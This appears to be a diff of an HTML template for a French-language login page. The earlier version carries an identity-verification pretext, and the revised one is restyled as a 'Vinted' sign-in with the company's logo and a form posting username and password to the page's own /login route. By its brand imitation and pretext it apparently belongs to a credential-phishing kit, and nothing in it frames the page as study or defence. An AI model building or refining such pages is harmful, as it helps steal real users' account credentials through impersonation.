@@ -1,124 +1,116 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Se connecter</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0; /* Ajouté pour correspondre à verify.html */
-      padding: 0; /* Ajouté pour correspondre à verify.html */
-    }
-
-    html, body {
-      height: 100%;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      /* Modification pour aligner les styles généraux de l'arrière-plan avec verify.html */
-      background: #f2f2f2 url("{{ url_for('static', filename='img/background.jpg') }}") no-repeat center center fixed;
-      background-size: cover;
-      background-position: center center; /* S'assurer du centrage par défaut */
-
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh; /* S'assurer que le corps prend au moins toute la hauteur de la vue */
-      /* overflow-y: auto;  Non nécessaire ici si la modal est la seule chose à faire défiler */
-      /* padding: 20px 0; Non nécessaire si le body ne sert que de conteneur centré */
-    }
-
-    /* Styles de la modal pour correspondre à verify.html (dimensions) */
-    .modal {
-      background-color: white;
-      width: 90%;
-      max-width: 400px; /* Aligné avec la max-width de verify.html */
-      padding: 30px; /* Aligné avec le padding de verify.html */
-      border-radius: 8px; /* Aligné avec le border-radius de verify.html */
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); /* Aligné avec l'ombre de verify.html */
-      text-align: center; /* Centrage du texte pour correspondre à verify.html */
-    }
-
-    p {
-      text-align: center;
-      font-weight: bold;
-      font-size: 16px;
-      margin-bottom: 15px;
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 25px;
-    }
-
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 12px 15px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 14px;
-    }
-
-    button {
-      width: 100%;
-      background-color: #007b76;
-      color: white;
-      padding: 12px;
-      font-size: 16px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #005e59;
-    }
-
-    .links {
-      text-align: center;
-      margin-top: 10px;
-    }
-
-    .links a {
-      font-size: 13px;
-      color: #007b76;
-      text-decoration: none;
-      display: block;
-      margin-top: 5px;
-    }
-
-    /* Responsive adjustment for mobile screens */
-    @media (max-width: 480px) {
-      html, body {
-        background-size: contain; /* Ajuste l'image pour qu'elle tienne entièrement dans l'écran */
-        background-position: top center; /* Centre l'image en haut de l'écran */
-        background-repeat: no-repeat; /* Empêche la répétition de l'image */
-        background-attachment: scroll; /* L'image défile avec le contenu sur mobile */
-      }
-      .modal {
-        padding: 20px 15px; /* Conserve le padding ajusté pour les petites tailles d'écran */
-      }
-      input, button {
-        font-size: 15px; /* Conserve la taille de police ajustée */
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Se connecter - Vinted</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 25px;
+        }
+        .logo img {
+            max-width: 150px;
+            height: auto;
+            border: 0;
+        }
+        h2 {
+            font-size: 26px;
+            color: #007b76;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #555;
+        }
+        .form-group input[type="text"],
+        .form-group input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .form-group input[type="text"]:focus,
+        .form-group input[type="password"]:focus {
+            border-color: #007b76;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 123, 118, 0.25);
+        }
+        button[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #007b76;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+        button[type="submit"]:hover {
+            background-color: #00605c;
+        }
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin-top: 20px;
+        }
+        .info-text a {
+            color: #007b76;
+            text-decoration: none;
+        }
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-  <div class="modal">
-    <p>Pour garantir la sécurité de notre communauté, vous devez valider votre identité avant de poursuivre. Cela ne prend qu’une minute !</p>
-    <h2>Se connecter </h2>
-    <form action="/login" method="post">
-      <input type="text" name="username" placeholder="E‑mail ou nom d’utilisateur" required autocomplete="username">
-      <input type="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
-      <button type="submit">Continuer</button>
-    </form>
-    <div class="links">
-      <a href="#">Mot de passe oublié ?</a>
-      <a href="#">Vous rencontrez des problèmes ?</a>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
+        </div>
+        <h2>Se connecter</h2>
+        <form action="/login" method="POST">
+            <div class="form-group">
+                <label for="username">Nom d'utilisateur ou e-mail</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit">Se connecter</button>
+        </form>
+        <p class="info-text">
+            Vous n'avez pas de compte ? <a href="#">S'inscrire</a><br>
+            <a href="#">Mot de passe oublié ?</a>
+        </p>
     </div>
-  </div>
 </body>
 </html>
